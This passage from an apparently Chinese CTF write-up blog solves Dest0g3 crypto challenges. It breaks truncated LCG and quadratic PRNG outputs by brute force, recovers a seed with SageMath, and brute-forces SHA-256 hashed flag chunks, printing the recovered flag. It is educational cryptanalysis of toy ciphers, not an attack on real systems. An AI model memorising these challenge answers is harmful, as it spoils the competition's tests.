Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure>
<p>这里我选择的是第一个成功的来作为seed。跑的话大概三分钟跑到这。还好这题第一个就是正确的解。如果解在后面的话，又得重新跑了。不过想要遍历整个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>空间还是挺困难的。</p>
<p>在做Mr.Doctor的时候发现有更简单的解法。</p>
<p>我们去遍历损失的那16位数据即可。这个搜索空间可比之前的小的多。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>):<br>    lcg.seed = (<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>        likeSeed.append((<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed)<br>        <span class="hljs-built_in">print</span>(likeSeed[-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> likeSeed:<br>    lcg.seed = i<br>    lcg.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br>    <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1137839988</span><br><span class="hljs-string">1137855425</span><br><span class="hljs-string">1137870862</span><br><span class="hljs-string">Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span><br><span class="hljs-string">Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span><br><span class="hljs-string">Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure>
<p>由于跑出来的结果并不止一个所以都进行运算即可。</p>
<h2 id="mrdoctor"><a class="markdownIt-Anchor" href="#mrdoctor"></a> Mr.Doctor</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> string<br><br>table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA256</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.proof = []<br>        self.sha = <span class="hljs-number">0</span><br>        self.sha_flag = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encryption</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>):<br>            self.proof.append(flag[<span class="hljs-number">4</span> * i:<span class="hljs-number">4</span> + <span class="hljs-number">4</span> * i])<br>            self.sha = sha256(self.proof[i]).hexdigest().encode()<br>            self.sha_flag.append(bytes_to_long(self.sha))<br>        <span class="hljs-keyword">return</span> self.sha_flag<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = getPrime(<span class="hljs-number">64</span>)<br>        self.Amiya = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Rosmontis = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Blaze = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.seed = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>sha = SHA256()<br>sha_flag = sha.encryption()<br>elite = RHODES_ELITE()<br>elite.output()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ash = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SliverAsh = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br>W = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="hljs-number">3</span>) ^ (elite.<span class="hljs-built_in">next</span>() % <span class="hljs-number">100</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(sha_flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(W))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Amiya =  956366446278</span><br><span class="hljs-string">Rosmontis =  1061992537343</span><br><span class="hljs-string">Blaze =  636205571590</span><br><span class="hljs-string">Doctor =  18068433704538283397</span><br><span class="hljs-string">Ash =  1097363493609113</span><br><span class="hljs-string">SliverAsh =  2051431344160327</span><br><span class="hljs-string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>
<p>这题代码和ezStream挺像的。主体都是一个流加密。</p>
<p>我们可以得到第二轮加密时的seed</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 mod 18068433704538283397</span><br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>r = RHODES_ELITE()<br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">13</span>):<br>    r.seed =  (<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed<br>    <span class="hljs-keyword">if</span> r.<span class="hljs-built_in">next</span>() == <span class="hljs-number">2051431344160327</span>:<br>        <span class="hljs-comment"># seed = (1097363493609113 &lt;&lt; 12) + seed</span><br>        likeSeed.append((<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(likeSeed)<br><span class="hljs-comment"># [4494800869822930172]</span><br></code></pre></td></tr></table></figure>
<p>可以看到只有一个解。接下来我们还要求解初始的seed才能进行解密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>    self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>    <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br></code></pre></td></tr></table></figure>
<p>这个实际上是一个整环上的运算。是在Zmod(18068433704538283397)上的一个多项式。</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>=</mo><mn>4494800869822930172</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 \, mod \, 18068433704538283397
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>−</mo><mn>4494800869822930172</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">f(x)=956366446278x^2 + 1061992537343x + 636205571590 - 4494800869822930172  \, mod \, 18068433704538283397
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p>
<p>我们求解这个多项式即可得到对应的seed值。这里使用的SageMath来计算。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">R.&lt;x&gt; = Zmod(<span class="hljs-number">18068433704538283397</span>)[]<br>f = <span class="hljs-number">956366446278</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">1061992537343</span>*x + <span class="hljs-number">636205571590</span> - <span class="hljs-number">4494800869822930172</span><br>f.roots()<br><span class="hljs-comment"># [(12358488364449364025, 1), (626844643882, 1)]</span><br></code></pre></td></tr></table></figure>
<p>可以看到这里有两个值，12358488364449364025和626844643882。</p>
<p>这里seed要是40位的数才行。12358488364449364025是64位的，而626844643882是40位的。所以我们的seed是626844643882。</p>
<p>前面这部分只是这题的一部分难点。得到了seed后面怎么进行处理考虑了半天。这又是sha的又是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>e</mi><msup><mi>d</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">mod (seed^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 没有办法逆过程。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br></code></pre></td></tr></table></figure>
<p>当时看到有个table在这但是没有用到我还感到奇怪。现在看来，是叫我们暴力破解了。</p>
<p>字符集应该就是这个。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">626844643882</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br>seed = <span class="hljs-number">626844643882</span><br>r = RHODES_ELITE()<br>r.<span class="hljs-built_in">next</span>()<br>r.<span class="hljs-built_in">next</span>()<br>flag = <span class="hljs-number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br>flag = long_to_bytes(flag)<br><br><span class="hljs-comment"># 先用小写字母跑一下试试</span><br>table = string.ascii_lowercase + string.digits<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.permutations(table,<span class="hljs-number">4</span>):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>奇怪的是，我好多都跑不出来？9组数据我就跑出来三组。一开始以为是用的枚举导致的。后面换成笛卡尔集也没跑出来。后面怀疑是不是字符集少了东西。因为看其他的flag中间一般都会有几个’-‘或者’_’，所以我把’-_'都添加到了字符集，然后再跑。发现能够跑出来了。</p>
